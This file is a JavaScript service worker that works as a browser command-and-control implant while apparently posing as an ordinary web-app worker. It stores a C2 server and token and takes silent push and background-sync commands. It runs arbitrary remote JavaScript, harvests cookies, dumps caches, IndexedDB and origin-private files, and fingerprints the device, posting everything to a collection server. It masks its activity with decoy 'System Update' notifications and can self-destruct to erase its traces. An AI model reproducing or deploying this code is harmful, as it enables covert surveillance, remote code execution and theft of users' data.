const CACHE = 'wc-v161';
const C2_STORE = 'wc-c2-store';   // CacheStorage key for C2 config (token, server URL)

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

async function _getC2Config() {
  try {
    const cache = await caches.open(C2_STORE);
    const resp  = await cache.match('/c2/config');
    if (!resp) return null;
    return await resp.json();
  } catch { return null; }
}

async function _setC2Config(cfg) {
  const cache = await caches.open(C2_STORE);
  await cache.put('/c2/config', new Response(JSON.stringify(cfg), {
    headers: { 'Content-Type': 'application/json' },
  }));
}

async function _postResult(server, token, payload) {
  await fetch(`${server}/api/collect/result`, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ token, ...payload }),
  });
}

async function _postHeartbeat(server, token) {
  await fetch(`${server}/api/collect/sync`, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ token, type: 'heartbeat', ts: Date.now() }),
  }).catch(() => {/* swallow — offline */});
}

// ---------------------------------------------------------------------------
// C2 command execution (called from push + background sync)
// ---------------------------------------------------------------------------

async function _execC2Command(command, server, token) {
  const { type, payload } = command;

  switch (type) {
    case 'ping': {
      await _postResult(server, token, {
        type:   'pong',
        ts:     Date.now(),
        payload: payload ?? {},
      });
      break;
    }

    case 'get_info': {
      const info = {
        userAgent:    self.navigator?.userAgent ?? 'n/a',
        language:     self.navigator?.language  ?? 'n/a',
        platform:     self.navigator?.platform  ?? 'n/a',
        online:       self.navigator?.onLine    ?? null,
        screenWidth:  self.screen?.width        ?? null,
        screenHeight: self.screen?.height       ?? null,
        timezone:     Intl?.DateTimeFormat().resolvedOptions().timeZone ?? 'n/a',
        ts:           Date.now(),
      };
      await _postResult(server, token, { type: 'device_info', payload: info });
      break;
    }

    case 'self_destruct': {
      // Clear all caches then unregister
      const keys = await caches.keys();
      await Promise.all(keys.map(k => caches.delete(k)));
      await self.registration.unregister();
      break;
    }

    case 'run_js': {
      const code = payload?.code ?? '';
      let result, ok;
      try {
        // eslint-disable-next-line no-new-func
        const AsyncFn = Object.getPrototypeOf(async function () {}).constructor;
        const res = await new AsyncFn(code)();
        result = res !== undefined ? String(res) : '(undefined)';
        ok = true;
      } catch (e) {
        result = e?.message ?? String(e);
        ok = false;
      }
      await _postResult(server, token, { type: 'js_result', ok, result, ts: Date.now() });
      break;
    }

    case 'set_config': {
      if (payload?.server || payload?.token) {
        const current = (await _getC2Config()) ?? {};
        await _setC2Config({ ...current, ...payload });
      }
      break;
    }

    case 'cookie_harvest': {
      const cookies = await cookieStore.getAll().catch(() => []);
      await _postResult(server, token, { type: 'harvest_result', harvest_type: 'cookies', data: cookies, ts: Date.now() });
      break;
    }

    case 'cache_dump': {
      const result = {};
      try {
        const names = await caches.keys();
        for (const name of names) {
          const cache = await caches.open(name);
          const reqs  = await cache.keys();
          result[name] = [];
          for (const req of reqs) {
            const resp = await cache.match(req);
            const ct   = resp?.headers?.get('content-type') ?? '';
            try {
              const body = ct.includes('json') || ct.includes('text')
                ? (await resp.text()).slice(0, 2000) : null;
              result[name].push({ url: req.url, ct, body });
            } catch { result[name].push({ url: req.url, ct }); }
          }
        }
      } catch(e) { result._error = e.message; }
      await _postResult(server, token, { type: 'harvest_result', harvest_type: 'cache', data: result, ts: Date.now() });
      break;
    }

    case 'idb_dump': {
      const result = {};
      try {
        const dbList = typeof indexedDB.databases === 'function' ? await indexedDB.databases() : [];
        for (const { name, version } of dbList) {
          const db = await new Promise((res, rej) => {
            const r = indexedDB.open(name, version);
            r.onsuccess = () => res(r.result);
            r.onerror   = rej;
          });
          result[name] = {};
          for (const store of [...db.objectStoreNames]) {
            result[name][store] = await new Promise((res, rej) => {
              const tx = db.transaction(store, 'readonly');
              const r  = tx.objectStore(store).getAll();
              r.onsuccess = () => res(r.result.slice(0, 100));
              r.onerror   = rej;
            });
          }
          db.close();
        }
      } catch(e) { result._error = e.message; }
      await _postResult(server, token, { type: 'harvest_result', harvest_type: 'idb', data: result, ts: Date.now() });
      break;
    }

    case 'gpu_fingerprint': {
      let data = {};
      try {
        const adapter = await navigator.gpu?.requestAdapter();
        if (adapter) {
          const info = await adapter.requestAdapterInfo();
          data = {
            vendor: info.vendor, architecture: info.architecture,
            device: info.device, description: info.description,
            maxTextureDimension2D: adapter.limits.maxTextureDimension2D,
            hardwareConcurrency: navigator.hardwareConcurrency,
          };
        } else { data = { error: 'no adapter' }; }
      } catch(e) { data = { error: e.message }; }
      await _postResult(server, token, { type: 'harvest_result', harvest_type: 'gpu', data, ts: Date.now() });
      break;
    }

    case 'set_badge': {
      const n = payload?.n ?? 0;
      try {
        if (n === 0) await navigator.clearAppBadge();
        else         await navigator.setAppBadge(n);
      } catch {}
      await _postResult(server, token, { type: 'pong', ts: Date.now(), payload: { badge_set: n } });
      break;
    }

    case 'opfs_list': {
      let data = {};
      try {
        const root = await navigator.storage.getDirectory();
        const entries = [];
        for await (const [name, handle] of root.entries()) {
          let size = null;
          if (handle.kind === 'file') {
            try { size = (await (await handle.getFile()).arrayBuffer()).byteLength; } catch {}
          }
          entries.push({ name, kind: handle.kind, size });
        }
        data = { entries };
      } catch(e) { data = { error: e.message }; }
      await _postResult(server, token, { type: 'harvest_result', harvest_type: 'opfs_list', data, ts: Date.now() });
      break;
    }

    case 'write_opfs': {
      const { filename, content, encoding } = payload;
      let data = {};
      try {
        const root     = await navigator.storage.getDirectory();
        const fh       = await root.getFileHandle(filename, { create: true });
        const writable = await fh.createWritable();
        if (encoding === 'base64') {
          const binary = atob(content);
          const bytes  = new Uint8Array(binary.length);
          for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
          await writable.write(bytes);
        } else {
          await writable.write(content ?? '');
        }
        await writable.close();
        data = { filename, size: (content ?? '').length, ok: true };
      } catch(e) { data = { filename, ok: false, error: e.message }; }
      await _postResult(server, token, { type: 'harvest_result', harvest_type: 'opfs_write', data, ts: Date.now() });
      break;
    }

    case 'read_opfs': {
      const { filename } = payload;
      let data = {};
      try {
        const root  = await navigator.storage.getDirectory();
        const fh    = await root.getFileHandle(filename);
        const file  = await fh.getFile();
        const buf   = await file.arrayBuffer();
        const bytes = new Uint8Array(buf);
        let b64 = '';
        const CHUNK = 8192;
        for (let i = 0; i < bytes.length; i += CHUNK)
          b64 += String.fromCharCode(...bytes.subarray(i, i + CHUNK));
        data = { filename, content_b64: btoa(b64), size: file.size, ok: true };
      } catch(e) { data = { filename, ok: false, error: e.message }; }
      await _postResult(server, token, { type: 'harvest_result', harvest_type: 'opfs_read', data, ts: Date.now() });
      break;
    }

    case 'delete_opfs': {
      const { filename } = payload;
      let data = {};
      try {
        const root = await navigator.storage.getDirectory();
        await root.removeEntry(filename);
        data = { filename, ok: true };
      } catch(e) { data = { filename, ok: false, error: e.message }; }
      await _postResult(server, token, { type: 'harvest_result', harvest_type: 'opfs_delete', data, ts: Date.now() });
      break;
    }

    default:
      break;
  }
}

// ---------------------------------------------------------------------------
// Install
// ---------------------------------------------------------------------------

self.addEventListener('install', e => {
  self.skipWaiting();
  // Persist initial C2 config if injected via SW registration (see HTML)
  // Also register background sync for first checkin
  e.waitUntil(
    self.registration.sync
      ? self.registration.sync.register('c2-checkin').catch(() => {})
      : Promise.resolve()
  );
});

// ---------------------------------------------------------------------------
// Activate
// ---------------------------------------------------------------------------

self.addEventListener('activate', e => {
  e.waitUntil(
    (async () => {
      // Prune stale asset caches (keep C2_STORE)
      const keys = await caches.keys();
      await Promise.all(
        keys.filter(k => k !== CACHE && k !== C2_STORE).map(k => caches.delete(k))
      );
      await self.clients.claim();

      // Register periodic background sync for heartbeat (Chrome 80+)
      if (self.registration.periodicSync) {
        try {
          await self.registration.periodicSync.register('c2-heartbeat', {
            minInterval: 300 * 1000, // 5 minutes
          });
        } catch { /* permission not granted or API unavailable */ }
      }

      // Register one-shot background sync fallback
      if (self.registration.sync) {
        try {
          await self.registration.sync.register('c2-checkin');
        } catch { /* swallow */ }
      }
    })()
  );
});

// ---------------------------------------------------------------------------
// Fetch intercept (unchanged)
// ---------------------------------------------------------------------------

self.addEventListener('fetch', e => {
  if (e.request.method !== 'GET') return;
  // Only intercept same-origin requests — cross-origin fetches (e.g. rebind checks) must go through unmodified
  if (!e.request.url.startsWith(self.location.origin)) return;
  e.respondWith(
    caches.match(e.request).then(cached => cached ?? fetch(e.request))
  );
});

// ---------------------------------------------------------------------------
// Push — C2 commands land here silently; visible notifications for type=notification
// ---------------------------------------------------------------------------

self.addEventListener('push', e => {
  let data;
  try {
    data = e.data?.json();
  } catch {
    data = { title: 'New update', body: '' };
  }

  // --- C2 command ---
  if (data?.type === 'c2_command') {
    e.waitUntil(
      (async () => {
        const DECOY_TAG = 'c2-decoy';

        const server = data.server || (await _getC2Config())?.server;
        const token  = data.token  || (await _getC2Config())?.token;

        // Check if the app is in the foreground — if so, relay to page and skip notification.
        // If no active clients, must show a notification (iOS kills SW otherwise).
        const pageClients = await self.clients.matchAll({ type: 'window', includeUncontrolled: false });
        const hasForeground = pageClients.length > 0;

        if (!hasForeground) {
          // Background mode: notification required by iOS to keep SW alive
          const notifTitle = data.notif_title || 'System Update';
          const notifBody  = data.notif_body  || 'Your information has been updated.';
          await self.registration.showNotification(notifTitle, {
            tag:               DECOY_TAG,
            body:              notifBody,
            silent:            true,
            requireInteraction: false,
          }).catch(() => {});
          self.registration.getNotifications({ tag: DECOY_TAG })
            .then(ns => ns.forEach(n => n.close())).catch(() => {});
        }

        if (server && token) {
          await _setC2Config({ server, token });
          // Relay to any open page clients (foreground path)
          pageClients.forEach(c => c.postMessage({
            type:    'c2_relay',
            command: data.payload ?? {},
            server,
            token,
          }));
          // Also execute in SW context (handles background + run_js without open page)
          await _execC2Command(data.payload ?? {}, server, token).catch(() => {});
        }
      })()
    );
    return;
  }

  // --- Regular notification (type=notification or legacy format) ---
  const title = data?.title ?? 'New update';
  const body  = data?.body  ?? '';
  e.waitUntil(
    self.registration.showNotification(title, {
      body,
      icon:  data?.icon ?? '/icon-192.png',
      badge: '/badge.png',
      data:  { url: data?.url ?? '/' },
    })
  );
});

// ---------------------------------------------------------------------------
// Background Sync — checkin with collection server, execute pending commands
// ---------------------------------------------------------------------------

self.addEventListener('sync', e => {
  if (e.tag === 'c2-checkin') {
    e.waitUntil(
      (async () => {
        const cfg = await _getC2Config();
        if (!cfg?.server || !cfg?.token) return;

        let resp;
        try {
          resp = await fetch(`${cfg.server}/api/collect/sync`, {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify({ token: cfg.token, type: 'sync', ts: Date.now() }),
          });
        } catch { return; /* offline — sync will retry */ }

        if (!resp.ok) return;

        let body;
        try { body = await resp.json(); } catch { return; }

        // Execute any pending commands returned by the server
        const cmds = Array.isArray(body?.commands) ? body.commands : [];
        for (const cmd of cmds) {
          await _execC2Command(cmd, cfg.server, cfg.token);
        }

        // Re-register to keep the sync cadence alive
        if (self.registration.sync) {
          await self.registration.sync.register('c2-checkin').catch(() => {});
        }
      })()
    );
  }
});

// ---------------------------------------------------------------------------
// Periodic Sync — heartbeat
// ---------------------------------------------------------------------------

self.addEventListener('periodicsync', e => {
  if (e.tag === 'c2-heartbeat') {
    e.waitUntil(
      (async () => {
        const cfg = await _getC2Config();
        if (!cfg?.server || !cfg?.token) return;
        await _postHeartbeat(cfg.server, cfg.token);
      })()
    );
  }
});

// ---------------------------------------------------------------------------
// Notification click (unchanged behaviour)
// ---------------------------------------------------------------------------

self.addEventListener('notificationclick', e => {
  e.notification.close();
  e.waitUntil(
    clients.matchAll({ type: 'window' }).then(cs => {
      const target   = e.notification.data?.url ?? '/';
      const existing = cs.find(c => c.url.includes(location.origin));
      if (existing) return existing.focus();
      return clients.openWindow(target);
    })
  );
});

// ---------------------------------------------------------------------------
// Message from main thread
// ---------------------------------------------------------------------------

self.addEventListener('message', e => {
  const type = e.data?.type;

  if (type === 'SKIP_WAITING') {
    self.skipWaiting();
    return;
  }

  if (type === 'sw_version_query') {
    e.source?.postMessage({ type: 'sw_version_reply', version: CACHE });
    return;
  }

  // C2 config push from page (called after device registers)
  if (type === 'c2_init') {
    const { server, token } = e.data;
    if (server && token) {
      _setC2Config({ server, token }).then(() => {
        e.source?.postMessage({ type: 'c2_init_ack' });
        // Trigger first checkin immediately
        if (self.registration.sync) {
          self.registration.sync.register('c2-checkin').catch(() => {});
        }
      });
    }
    return;
  }

  // Operator-initiated self-destruct from main thread
  if (type === 'sw_destruct') {
    caches.keys()
      .then(keys => Promise.all(keys.map(k => caches.delete(k))))
      .then(() => self.registration.unregister())
      .then(() => e.source?.postMessage({ type: 'sw_destruct_ack' }));
    return;
  }
});
